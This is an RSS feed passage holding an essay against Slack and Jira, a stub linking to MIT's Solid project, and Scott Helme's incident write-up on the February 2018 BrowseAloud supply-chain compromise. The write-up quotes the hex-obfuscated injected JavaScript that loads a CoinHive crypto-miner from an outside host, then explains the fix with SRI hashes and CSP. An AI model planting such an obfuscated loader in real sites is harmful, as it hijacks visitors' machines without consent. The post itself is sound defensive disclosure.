&lt;li&gt;&lt;a href=&quot;https://abe-winter.github.io/plea%27s/help/2018/02/11/slack.html#deleteuber&quot; id=&quot;markdown-toc-deleteuber&quot;&gt;#deleteuber&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Between 2014 and 2016 my working life went through a lot of changes but the worst one was the normalization of slack. Managers like it because it ‘gets things down on paper’, ‘improves reachability’, ‘gets questions answered quickly’. My argument is that it destroys teams’ ability to think, plan &amp;amp; get complex work out the door. Read on for the full story.&lt;/p&gt;
&lt;h2 id=&quot;interruptions&quot;&gt;Interruptions&lt;/h2&gt;
&lt;p&gt;slack empowers your worst people to overwhelm your best. It has that in common with the open office.&lt;/p&gt;
&lt;p&gt;It normalizes interruptions, multitasking, and distractions, implicitly permitting these things to happen IRL as well as online. It normalizes insanely short reply times for questions. In the slack world people can escalate from asking in a room to @person to @here in a matter of minutes. And they’re not wrong to – if your request isn’t handled in 5 minutes it’s as good as forgotten.&lt;/p&gt;
&lt;p&gt;Somewhere along the way we forgot that interruptions are toxic to real work. It wasn’t always this way. On day 1 of my first trading job the only instruction I received was ‘when the market is open, mute your phone.’ The subtext was ‘or else’. If someone said this to me today I’d give them a hug, and I’m not a hugger.&lt;/p&gt;
&lt;p&gt;I’ve tried to have this conversation with people who respond with ‘this is an office; it shouldn’t be a library’. At the time I was only livid. If someone said this to me today, two years into my life as a slack user, I’m not sure how I would react.&lt;/p&gt;
&lt;p&gt;Remote work culture is a defense mechanism against the distracting open office, and slack is the end run around that defense mechanism. It abrades your team’s adrenal system and forces you to live in the present. Unlike email, it can’t delay messages. Chat makes ‘now or never’ your team’s reality.&lt;/p&gt;
&lt;p&gt;When everything is urgent nothing is. This is the master plan of the villain in pixar’s incredibles. slack is a supervillain plot to destroy your team.&lt;/p&gt;
&lt;h2 id=&quot;the-format-is-fragmented-and-constrained&quot;&gt;The format is fragmented and constrained&lt;/h2&gt;
&lt;p&gt;Chat is not editable, or not in the way you’d want. You can edit text for some time window but it doesn’t create an alert. I think corrections and careful research are more important than initial reactions. I prefer the G docs model, where comments / questions create an alert and initial text doesn’t.&lt;/p&gt;
&lt;p&gt;Chat, at least on slack, isn’t grouped or threaded. ‘What about rooms?’ you ask. In my experience (at 4+ companies) rooms aren’t a clear delineation; they tend to anchor groups rather than topics and topics/conversations still overlap in any one channel. Under the typical use patterns I’ve observed, it’s non-trivial to know what the current topics of conversation are in a slack channel or to assign one of those topics to any given message.&lt;/p&gt;
&lt;p&gt;Scrolling would be a great way to identify the topic but scrolling is totally broken. Scrolling up more than two pages’ worth causes nightmare reflows, anchor jumping – things that more civilized computer users from the 80s or 90s would call glitches but modern web users have come to tolerate.&lt;/p&gt;
&lt;p&gt;Email is way better at threading and slack has killed it – nobody will pay attention to both.&lt;/p&gt;
&lt;p&gt;slack is inherently rushed: I feel like I’m in a hurry to whisper before someone shouts. The ‘is typing’ feature is the nail in the coffin here. It shuts down my ability to think coherently. I find myself composing messages in the address bar with my eyes closed to ward off panic.&lt;/p&gt;
&lt;p&gt;‘is typing’ allows slow typists to dissolve group thought. Sorry for the metaphor but it’s like having an old man pee on your face one trickle at a time. I’d rather have it over with quickly and go wash up.&lt;/p&gt;
&lt;p&gt;Paradoxically, speed is just as toxic to group thought, as people will race to get out ideas and leave them half-formed or contradictory. Missing ‘not’ in a sentence is my favorite. When people catch themselves at this they will post a &lt;code class=&quot;highlighter-rouge&quot;&gt;*not&lt;/code&gt;, sometimes a few lines down. I feel like I’m in a wayne’s world sketch.&lt;/p&gt;
&lt;h2 id=&quot;slack-search-is-broken&quot;&gt;slack search is broken&lt;/h2&gt;
&lt;p&gt;In like every way it’s possible to break search:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;in part because unlike threads in email / forums, there’s no natural grouping, so you can only search for messages&lt;/li&gt;
&lt;li&gt;in part because the slack search feature is badly implemented – adjacent messages show up as separate results, even when their before/after context overlaps&lt;/li&gt;
&lt;li&gt;I never know what clicking will do – sometimes it will scroll my channel to the message, other times show or hide or resize the search result&lt;/li&gt;
&lt;li&gt;the ‘more results’ button takes me to a paged view but the first results are the same 3 I just saw – i.e. ‘more’ takes me from page 1 to page 1. WTF.&lt;/li&gt;
&lt;li&gt;ctrl-f, the one constant of web interaction, is broken in channels if you’re searching more than one page up. We can blame this on the DOM but I assume this is because slack’s heavy CSS uses too much memory to keep a long scroll history.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;I get that this is just a UX issue and is fixable but (1) I don’t know if it &lt;em&gt;is&lt;/em&gt; fixable when your foundation is the sandy marsh that is the DOM and (2) if slack were a tool for augmenting thought rather than preventing it, it would have a working search feature.&lt;/p&gt;
&lt;h2 id=&quot;it-increases-productivity-the-bad-kind&quot;&gt;It increases productivity (the bad kind)&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Goodhart%27s_law&quot;&gt;Goodhart’s law&lt;/a&gt; is the one where turning a metric into a target makes it a bad metric. Slack subverts valuable work by making productivity = availability on slack.&lt;/p&gt;
&lt;p&gt;Productivity as a metric is problematic because it’s so hard to measure or even to define in a general way. In economics, total factor productivity is basically wages minus capital, and is flummoxed by the fact that better tools don’t put more money in people’s pockets (employees are generally paid for their time).&lt;/p&gt;
&lt;p&gt;At work, productivity conflates delivery and business value. We know how to measure the first but we mostly care about the second. Optimizing delivery rate has bad effects on products and teams:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Middle managers will make deliverables smaller and less valuable so they can declare a win to their bosses or so the C-suite can brag to shareholders&lt;/li&gt;
&lt;li&gt;Which in turn moves design work from domain experts to PMs, resulting in nuts designs&lt;/li&gt;
&lt;li&gt;And it increases utilization, which leads to burnout, reduces safety margins, stifles innovation (that’s what those spare cycles were getting used for)&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;These points are part of a larger tug of war between middle managers and programmers. That argument is out of scope for this article, except to say that pervasive chat empowers middle managers (i.e. people who like to check in a lot) to do so, at the expense of your creatives’ well-being and your long-term organizational health.&lt;/p&gt;
&lt;p&gt;Why are people blind to this? I think because most people never understood how work gets done or don’t think about it. Now slack comes in and makes ‘work’ visible in the form of instant replies to quick questions, dancing emoji stickers, and nonstop chatter, and some people are like, ‘yes! look at all that my team has accomplished’.&lt;/p&gt;
&lt;h2 id=&quot;it-replaces-documentation&quot;&gt;It replaces documentation&lt;/h2&gt;
&lt;p&gt;I think most people agree that when knowledge workers work together on teams they need to use writing to agree on what to do. On slack the quality of that writing is plumbing new depths. There’s a world of difference between a well-considered G doc that has been edited by multiple people vs a stream of consciousness mixed in with people’s WFH announcements and ‘look what my cat did’.&lt;/p&gt;
&lt;p&gt;24/7 reachability also hurts good docs practices. When people couldn’t get ahold of each other at all hours orgs had to design for redundancy, i.e. write things down such that they could be understood by someone else. But there’s a whole generation of workers and even companies that never experienced that.&lt;/p&gt;
&lt;p&gt;The information critical to your company’s ops is stored in three places:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;brains&lt;/li&gt;
&lt;li&gt;documents (including email)&lt;/li&gt;
&lt;li&gt;software&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The slack model increases the percent of your company’s critical decisions that rely on a specific brain. Good luck with that.&lt;/p&gt;
&lt;h2 id=&quot;what-does-slack-do-right&quot;&gt;What does slack do right&lt;/h2&gt;
&lt;p&gt;There’s one way in which slack edges out trello &amp;amp; jira for project management. T&amp;amp;J don’t implement backpressure; slack does, because there are limits to attention.&lt;/p&gt;
&lt;p&gt;But this is a goldilocks problem – neither the jira ‘kitchen sink’ model nor the slack ‘off the dome’ model is ideal. Also, lots of people want to use slack trello AND jira simultaneously without any sense of shame (2 is egregious but 3 is insane). Also, slack isn’t the right solution for project management, at minimum because it doesn’t have good aggregation views; not that jira really does either. We need to build scheduling tools that have well-considered limits, not the arbitrary limit of what people can process under high attention pressure.&lt;/p&gt;
&lt;h2 id=&quot;trello--jira&quot;&gt;trello &amp;amp; jira&lt;/h2&gt;
&lt;p&gt;Are also things I hate.&lt;/p&gt;
&lt;p&gt;They promote this icebox theory of design. What did a PM think of six months ago that hasn’t been started? Let’s do that. If your best people aren’t inventing and assigning projects, why should anyone bother showing up to work?&lt;/p&gt;
&lt;p&gt;JIRA has a screen real estate problem. Have you seen the articles about SERP shrinkage, where a G results page in 2004 was mostly results and now it’s mostly ads? JIRA &lt;em&gt;started out this way&lt;/em&gt;. 90% of the text on the screen isn’t your project’s information, it’s JIRA chrome.&lt;/p&gt;
&lt;p&gt;Another JIRA flaw: highly formalized process is usually a hindrance, especially considering who in your organization invents, applies and benefits from process. Hint: middle managers.&lt;/p&gt;
&lt;p&gt;The commoditization of communication &lt;em&gt;isn’t working&lt;/em&gt;. So let’s get off the wagon and start making considered plans again. A blank sheet of paper is all anyone has ever needed to do this well.&lt;/p&gt;
&lt;p&gt;Orgs do have a real need to get questions answered. You can say chat is the closest thing to this, but it comes with too many costs. Stack overflow was a cool innovation when it landed – marking questions completed. But bear in mind that the previous SERP winner, expertsexchange, hid the answer because they wanted to charge you for it, not for UX reasons. And SO has become relatively shitty now, and replaced docs for a lot of OSS libs.&lt;/p&gt;
&lt;h2 id=&quot;deleteuber&quot;&gt;#deleteuber&lt;/h2&gt;
&lt;p&gt;Deleting uber didn’t fix labor relations in the gig economy, but your org can free itself from chat anytime you want – &lt;a href=&quot;https://www.youtube.com/embed/9Vhca4V_FhM?start=58&amp;amp;end=85&quot;&gt;all you have to do is to stop&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Stop reading if you don’t care about any of the following:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;increasing your best people’s happiness&lt;/li&gt;
&lt;li&gt;being less reactive to distractions&lt;/li&gt;
&lt;li&gt;being more focused on real progress&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;If you &lt;em&gt;do&lt;/em&gt; care about those things, also stop reading but after you do, go dump chat.&lt;/p&gt;
&lt;p&gt;I took 4 months off in 2015 and when I rejoined the workforce in 2016 – distraction city. People were checking buzzing phones in meetings. Chat alerts were click-click-clicking all the time. There was no cultural support or even real understanding of the idea that you need to turn this stuff &lt;em&gt;off&lt;/em&gt; to get any work done. I made this point to a PM and his response was ‘oh, you have ADD’.&lt;/p&gt;
&lt;p&gt;Slack and the toxic behaviors it implicitly endorses will give ADD to your &lt;em&gt;whole company&lt;/em&gt;. Want a one-click competitive advantage? Delete your account.&lt;/p&gt;
</description>
<pubDate>Sun, 11 Feb 2018 23:35:41 +0000</pubDate>
<dc:creator>awinter-py</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://abe-winter.github.io/plea%27s/help/2018/02/11/slack.html</dc:identifier>
</item>
<item>
<title>Solid aims to radically change the way web applications work</title>
<link>https://solid.mit.edu/</link>
<guid isPermaLink="true" >https://solid.mit.edu/</guid>
<description>[unable to retrieve full-text content]&lt;p&gt;Article URL: &lt;a href=&quot;https://solid.mit.edu/&quot;&gt;https://solid.mit.edu/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Comments URL: &lt;a href=&quot;https://news.ycombinator.com/item?id=16355311&quot;&gt;https://news.ycombinator.com/item?id=16355311&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Points: 329&lt;/p&gt;&lt;p&gt;# Comments: 109&lt;/p&gt;</description>
<pubDate>Sun, 11 Feb 2018 22:52:51 +0000</pubDate>
<dc:creator>doener</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://solid.mit.edu/api/auth/select-provider?returnToUrl=https://solid.mit.edu/</dc:identifier>
</item>
<item>
<title>Protecting sites from Cryptojacking with CSP and SRI</title>
<link>https://scotthelme.co.uk/protect-site-from-cyrptojacking-csp-sri/</link>
<guid isPermaLink="true" >https://scotthelme.co.uk/protect-site-from-cyrptojacking-csp-sri/</guid>
<description>&lt;p&gt;We saw a pretty big event take place over the weekend where a 3rd party provider was compromised and their JS library was altered. The alteration introduced a crypto mining script that was then subsequently included on over 4,000 websites that I know of, many of which were Government websites...&lt;/p&gt;
&lt;br/&gt;&lt;h4 id=&quot;whathappened&quot;&gt;What happened&lt;/h4&gt;
&lt;p&gt;I had a friend of mine get in touch about his AV program throwing a warning when visiting the ICO website. The ICO bill themselves as:&lt;/p&gt;
&lt;br/&gt;&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;The UK’s independent authority set up to uphold information rights in the public interest, promoting openness by public bodies and data privacy for individuals.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;They're the people we complain to when companies do bad things with our data. It was pretty alarming to realise that they were running a crypto miner on their site, their &lt;em&gt;whole&lt;/em&gt; site, every single page.&lt;/p&gt;
&lt;br/&gt;&lt;blockquote class=&quot;twitter-tweet tw-align-center&quot; data-lang=&quot;en&quot; readability=&quot;5.5172413793103&quot;&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;Ummm, so yeah, this is *bad*. I just had &lt;a href=&quot;https://twitter.com/phat_hobbit?ref_src=twsrc%5Etfw&quot;&gt;@phat_hobbit&lt;/a&gt; point out that &lt;a href=&quot;https://twitter.com/ICOnews?ref_src=twsrc%5Etfw&quot;&gt;@ICOnews&lt;/a&gt; has a cryptominer installed on their site... 😮 &lt;a href=&quot;https://t.co/xQhspR7A2f&quot;&gt;pic.twitter.com/xQhspR7A2f&lt;/a&gt;&lt;/p&gt;
— Scott Helme (@Scott_Helme) &lt;a href=&quot;https://twitter.com/Scott_Helme/status/962684239975272450?ref_src=twsrc%5Etfw&quot;&gt;February 11, 2018&lt;/a&gt;&lt;/blockquote&gt;
&lt;p&gt;At first the obvious thought is that the ICO were compromised so I immediately started digging into this after firing off a few emails to contact people who may be able to help me with disclosure. I quickly realised though that this script, whilst present on the ICO website, was not being hosted by the ICO, it was included by a 3rd party library they loaded.&lt;/p&gt;
&lt;br/&gt;&lt;h4 id=&quot;theweaklink&quot;&gt;The weak link&lt;/h4&gt;
&lt;p&gt;If you want to load a crypto miner on 1,000+ websites you don't attack 1,000+ websites, you attack the 1 website that they all load content from. In this case it turned out that &lt;a href=&quot;https://www.texthelp.com&quot;&gt;Text Help&lt;/a&gt;, an assistive technology provider, had been compromised and one of their hosted script files changed. The offending asset can be found here (&lt;a href=&quot;https://www.browsealoud.com/plus/scripts/ba.js&quot;&gt;https://www.browsealoud.com/plus/scripts/ba.js&lt;/a&gt;) for the duration it remains but here is the snippet that matters.&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;/* [Warning] Do not copy or self host this file, you will not be supported */
/* BrowseAloud Plus v2.5.0 (13-09-2017) */


window[&quot;\x64\x6f\x63\x75\x6d\x65\x6e\x74&quot;][&quot;\x77\x72\x69\x74\x65&quot;](&quot;\x3c\x73\x63\x72\x69\x70\x74 \x74\x79\x70\x65\x3d\x27\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x27 \x73\x72\x63\x3d\x27\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x6f\x69\x6e\x68\x69\x76\x65\x2e\x63\x6f\x6d\x2f\x6c\x69\x62\x2f\x63\x6f\x69\x6e\x68\x69\x76\x65\x2e\x6d\x69\x6e\x2e\x6a\x73\x3f\x72\x6e\x64\x3d&quot;+window[&quot;\x4d\x61\x74\x68&quot;][&quot;\x72\x61\x6e\x64\x6f\x6d&quot;]()+&quot;\x27\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e&quot;);window[&quot;\x64\x6f\x63\x75\x6d\x65\x6e\x74&quot;][&quot;\x77\x72\x69\x74\x65&quot;]('\x3c\x73\x63\x72\x69\x70\x74\x3e \x69\x66 \x28\x6e\x61\x76\x69\x67\x61\x74\x6f\x72\x2e\x68\x61\x72\x64\x77\x61\x72\x65\x43\x6f\x6e\x63\x75\x72\x72\x65\x6e\x63\x79 \x3e \x31\x29\x7b \x76\x61\x72 \x63\x70\x75\x43\x6f\x6e\x66\x69\x67 \x3d \x7b\x74\x68\x72\x65\x61\x64\x73\x3a \x4d\x61\x74\x68\x2e\x72\x6f\x75\x6e\x64\x28\x6e\x61\x76\x69\x67\x61\x74\x6f\x72\x2e\x68\x61\x72\x64\x77\x61\x72\x65\x43\x6f\x6e\x63\x75\x72\x72\x65\x6e\x63\x79\x2f\x33\x29\x2c\x74\x68\x72\x6f\x74\x74\x6c\x65\x3a\x30\x2e\x36\x7d\x7d \x65\x6c\x73\x65 \x7b \x76\x61\x72 \x63\x70\x75\x43\x6f\x6e\x66\x69\x67 \x3d \x7b\x74\x68\x72\x65\x61\x64\x73\x3a \x38\x2c\x74\x68\x72\x6f\x74\x74\x6c\x65\x3a\x30\x2e\x36\x7d\x7d \x76\x61\x72 \x6d\x69\x6e\x65\x72 \x3d \x6e\x65\x77 \x43\x6f\x69\x6e\x48\x69\x76\x65\x2e\x41\x6e\x6f\x6e\x79\x6d\x6f\x75\x73\x28\'\x31\x47\x64\x51\x47\x70\x59\x31\x70\x69\x76\x72\x47\x6c\x56\x48\x53\x70\x35\x50\x32\x49\x49\x72\x39\x63\x79\x54\x7a\x7a\x58\x71\'\x2c \x63\x70\x75\x43\x6f\x6e\x66\x69\x67\x29\x3b\x6d\x69\x6e\x65\x72\x2e\x73\x74\x61\x72\x74\x28\x29\x3b\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e');

function toggleBar(){debug.trace(&quot;Legacy toggleBar()&quot;),(!BrowseAloud.config.isMobile||BrowseAloud.config.isMobile&amp;amp;&amp;amp;BrowseAloud.config.availableMobile)&amp;amp;&amp;amp;BrowseAloud.panel.toggleBar(!0)}var _ba_cv=&quot;2.5.0&quot;;if(void 0===_baApplicationServer)var......
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;ba.js&lt;/code&gt; had been altered to include a &lt;code&gt;document.write&lt;/code&gt; call that added a CoinHive crypto miner to any page it was loaded in to. This is a pretty bad situation to be in and any site that loads that file will now have the crypto miner installed. The sheer number of sites affected by this is huge and some of them are really prominent government websites!&lt;/p&gt;
&lt;br/&gt;&lt;blockquote class=&quot;twitter-tweet tw-align-center&quot; data-lang=&quot;en&quot; readability=&quot;2.3737373737374&quot;&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;It's also on &lt;a href=&quot;https://twitter.com/uscourts?ref_src=twsrc%5Etfw&quot;&gt;@uscourts&lt;/a&gt;! &lt;a href=&quot;https://t.co/UyPjzbEsPw&quot;&gt;pic.twitter.com/UyPjzbEsPw&lt;/a&gt;&lt;/p&gt;
— Scott Helme (@Scott_Helme) &lt;a href=&quot;https://twitter.com/Scott_Helme/status/962692890152620033?ref_src=twsrc%5Etfw&quot;&gt;February 11, 2018&lt;/a&gt;&lt;/blockquote&gt;
&lt;br/&gt;&lt;blockquote class=&quot;twitter-tweet tw-align-center&quot; data-lang=&quot;en&quot; readability=&quot;3.1465517241379&quot;&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;The Student Loan Company here in the UK: &lt;a href=&quot;https://t.co/aAq8grshWL&quot;&gt;pic.twitter.com/aAq8grshWL&lt;/a&gt;&lt;/p&gt;
— Scott Helme (@Scott_Helme) &lt;a href=&quot;https://twitter.com/Scott_Helme/status/962693243510181889?ref_src=twsrc%5Etfw&quot;&gt;February 11, 2018&lt;/a&gt;&lt;/blockquote&gt;
&lt;br/&gt;&lt;blockquote class=&quot;twitter-tweet tw-align-center&quot; data-lang=&quot;en&quot; readability=&quot;2.9326923076923&quot;&gt;
&lt;p lang=&quot;es&quot; dir=&quot;ltr&quot;&gt;The General Medical Council: &lt;a href=&quot;https://t.co/Q59OUr8jnr&quot;&gt;pic.twitter.com/Q59OUr8jnr&lt;/a&gt;&lt;/p&gt;
— Scott Helme (@Scott_Helme) &lt;a href=&quot;https://twitter.com/Scott_Helme/status/962693493201125382?ref_src=twsrc%5Etfw&quot;&gt;February 11, 2018&lt;/a&gt;&lt;/blockquote&gt;
&lt;br/&gt;&lt;blockquote class=&quot;twitter-tweet tw-align-center&quot; data-lang=&quot;en&quot; readability=&quot;3.0275229357798&quot;&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;The NHS is directly affected too: &lt;a href=&quot;https://t.co/PCRBYqYxaa&quot;&gt;pic.twitter.com/PCRBYqYxaa&lt;/a&gt;&lt;/p&gt;
— Scott Helme (@Scott_Helme) &lt;a href=&quot;https://twitter.com/Scott_Helme/status/962693802279559168?ref_src=twsrc%5Etfw&quot;&gt;February 11, 2018&lt;/a&gt;&lt;/blockquote&gt;
&lt;p&gt;That's a &lt;em&gt;lot&lt;/em&gt; of government websites and at the time of writing there's a quick search here on PublicWWW that lists over 4,000 sites loading the infected file: &lt;a href=&quot;https://publicwww.com/websites/browsealoud.com%2Fplus%2Fscripts%2Fba.js/&quot;&gt;https://publicwww.com/websites/browsealoud.com%2Fplus%2Fscripts%2Fba.js/&lt;/a&gt;&lt;/p&gt;
&lt;br/&gt;&lt;h4 id=&quot;preventingtheseattacks&quot;&gt;Preventing these attacks&lt;/h4&gt;
&lt;p&gt;This is not a particularly new attack and we've known for a long time that CDNs or other hosted assets are a prime target to compromise a single target and then infect potentially many thousands of websites. The thing is though, there's a pretty easy way to defend yourself against this attack. Let's take the ICO as an example, they load the affected file like this:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;script src=&quot;//www.browsealoud.com/plus/scripts/ba.js&quot; type=&quot;text/javascript&quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;That's a pretty standard way to load a JS file and the browser will go and fetch that file and include it in the page, along with the crypto miner... Want to know how you can easily stop this attack?&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;script src=&quot;//www.browsealoud.com/plus/scripts/ba.js&quot; integrity=&quot;sha256-Abhisa/nS9WMne/YX+dqiFINl+JiE15MCWvASJvVtIk=&quot; crossorigin=&quot;anonymous&quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;That's it. With that &lt;em&gt;tiny&lt;/em&gt; change to how the script is loaded, this attack would have been completely neutralised. What I've done here is add the &lt;a href=&quot;https://scotthelme.co.uk/subresource-integrity/&quot;&gt;SRI Integrity Attribute&lt;/a&gt; and that allows the browser to determine if the file has been modified, which allows it to reject the file. You can easily generate the appropriate script tags using the &lt;a href=&quot;https://report-uri.com/home/sri_hash&quot;&gt;SRI Hash Generator&lt;/a&gt; and rest assured the crypto miner could not have found its way into the page. To take this one step further and ensure absolute protection, you can use &lt;a href=&quot;https://scotthelme.co.uk/content-security-policy-an-introduction/&quot;&gt;Content Security Policy&lt;/a&gt; and the &lt;a href=&quot;https://scotthelme.co.uk/csp-cheat-sheet/#require-sri-for&quot;&gt;require-sri-for&lt;/a&gt; directive to make sure that no script is allowed to load on the page without an SRI integrity attribute. In short, this could have been totally avoided by all of those involved even though the file was modified by hackers. On top of all of that, you could be alerted to events like this happening on your site via &lt;a href=&quot;https://scotthelme.co.uk/csp-and-hpkp-violation-reporting-with-report-uri-io/&quot;&gt;CSP Reporting&lt;/a&gt; which is literally the reason I founded &lt;a href=&quot;https://report-uri.com&quot;&gt;Report URI&lt;/a&gt;. I guess, all in all, we really shouldn't be seeing events like this happen on this scale to such prominent sites.&lt;/p&gt;
&lt;br/&gt;&lt;h4 id=&quot;otherinformation&quot;&gt;Other information&lt;/h4&gt;
&lt;p&gt;The address of the affected script: &lt;a href=&quot;https://www.browsealoud.com/plus/scripts/ba.js&quot;&gt;https://www.browsealoud.com/plus/scripts/ba.js&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The whole 3rd party script that was affected: &lt;a href=&quot;https://pastebin.com/AHyehgS7&quot;&gt;https://pastebin.com/AHyehgS7&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The obfuscated script: &lt;a href=&quot;https://pastebin.com/x772SUQU&quot;&gt;https://pastebin.com/x772SUQU&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The de-obfuscated script: &lt;a href=&quot;https://pastebin.com/57vPLKAH&quot;&gt;https://pastebin.com/57vPLKAH&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;My blogs on CSP: &lt;a href=&quot;https://scotthelme.co.uk/tag/csp/&quot;&gt;https://scotthelme.co.uk/tag/csp/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;My blogs on SRI: &lt;a href=&quot;https://scotthelme.co.uk/tag/sri/&quot;&gt;https://scotthelme.co.uk/tag/sri/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;A list of sites most likely hit: &lt;a href=&quot;https://publicwww.com/websites/browsealoud.com%2Fplus%2Fscripts%2Fba.js/&quot;&gt;https://publicwww.com/websites/browsealoud.com%2Fplus%2Fscripts%2Fba.js/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Update 15:28 11th Feb 2018&lt;/strong&gt;&lt;br/&gt;TextHelp seem to have dropped the service in response to the attack:&lt;/p&gt;
&lt;blockquote class=&quot;twitter-tweet tw-align-center&quot; data-lang=&quot;en&quot; readability=&quot;3.169014084507&quot;&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;It seems that &lt;a href=&quot;https://twitter.com/texthelp?ref_src=twsrc%5Etfw&quot;&gt;@texthelp&lt;/a&gt; have responded and dropped the whole site: &lt;a href=&quot;https://t.co/Wymsc7owiw&quot;&gt;pic.twitter.com/Wymsc7owiw&lt;/a&gt;&lt;/p&gt;
— Scott Helme (@Scott_Helme) &lt;a href=&quot;https://twitter.com/Scott_Helme/status/962709974232248321?ref_src=twsrc%5Etfw&quot;&gt;February 11, 2018&lt;/a&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Update 16:32 11th Feb 2018&lt;/strong&gt;&lt;br/&gt;The ICO have taken their site offline:&lt;/p&gt;
&lt;blockquote class=&quot;twitter-tweet tw-align-center&quot; data-lang=&quot;en&quot; readability=&quot;2.7232142857143&quot;&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;The &lt;a href=&quot;https://twitter.com/ICOnews?ref_src=twsrc%5Etfw&quot;&gt;@ICOnews&lt;/a&gt; website is now offline: &lt;a href=&quot;https://t.co/GejpDSBAgw&quot;&gt;pic.twitter.com/GejpDSBAgw&lt;/a&gt;&lt;/p&gt;
— Scott Helme (@Scott_Helme) &lt;a href=&quot;https://twitter.com/Scott_Helme/status/962726044338917376?ref_src=twsrc%5Etfw&quot;&gt;February 11, 2018&lt;/a&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Update 17:04 11th Feb 2018&lt;/strong&gt;&lt;br/&gt;It seems the script file was modified between Sun, 11 Feb 2018 02:58:04 GMT and Sun, 11 Feb 2018 13:21:56 GMT.&lt;/p&gt;
&lt;blockquote class=&quot;twitter-tweet tw-align-center&quot; data-lang=&quot;en&quot; readability=&quot;5.8818897637795&quot;&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;It seems like the &lt;a href=&quot;https://twitter.com/texthelp?ref_src=twsrc%5Etfw&quot;&gt;@texthelp&lt;/a&gt; script file was modified between Sun, 11 Feb 2018 02:58:04 GMT and Sun, 11 Feb 2018 13:21:56 GMT according to the &lt;a href=&quot;https://twitter.com/internetarchive?ref_src=twsrc%5Etfw&quot;&gt;@internetarchive&lt;/a&gt;:&lt;a href=&quot;https://t.co/jwKLA6mq7N&quot;&gt;https://t.co/jwKLA6mq7N&lt;/a&gt;&lt;a href=&quot;https://t.co/ZHiUJXBpxC&quot;&gt;https://t.co/ZHiUJXBpxC&lt;/a&gt;&lt;/p&gt;
— Scott Helme (@Scott_Helme) &lt;a href=&quot;https://twitter.com/Scott_Helme/status/962734149344923648?ref_src=twsrc%5Etfw&quot;&gt;February 11, 2018&lt;/a&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Update 08:20 12th Feb 2018&lt;/strong&gt;&lt;br/&gt;TextHelp released a statement overnight:&lt;/p&gt;
&lt;blockquote class=&quot;twitter-tweet tw-align-center&quot; data-lang=&quot;en&quot; readability=&quot;3.2300884955752&quot;&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;TextHelp have just released a statement: &lt;a href=&quot;https://t.co/1HvNFPGxB7&quot;&gt;https://t.co/1HvNFPGxB7&lt;/a&gt;&lt;/p&gt;
— Scott Helme (@Scott_Helme) &lt;a href=&quot;https://twitter.com/Scott_Helme/status/962790081923878912?ref_src=twsrc%5Etfw&quot;&gt;February 11, 2018&lt;/a&gt;&lt;/blockquote&gt;
</description>
<pubDate>Sun, 11 Feb 2018 17:30:29 +0000</pubDate>
<dc:creator>Scott_Helme_</dc:creator>
<og:type>article</og:type>
<og:title>Protect your site from Cryptojacking with CSP + SRI</og:title>
<og:description>We saw a pretty big event take place over the weekend where a 3rd party provider was compromised and their JS library was altered. The alteration introduced a crypto mining script that was then subsequently included on over 4,000 websites that I know of, many of which were Government</og:description>
<og:url>https://scotthelme.co.uk/protect-site-from-cryptojacking-csp-sri/</og:url>
<og:image>https://scotthelme.co.uk/content/images/2018/02/ico-offline.png</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://scotthelme.co.uk/protect-site-from-cryptojacking-csp-sri/</dc:identifier>
</item>
<item>
<title>Insider trading has been rife on Wall Street, academics conclude</title>
<link>https://www.economist.com/news/finance-and-economics/21736561-one-study-suggests-insiders-profited-even-global-financial-crisis-another?frsc=dg%7Ce</link>
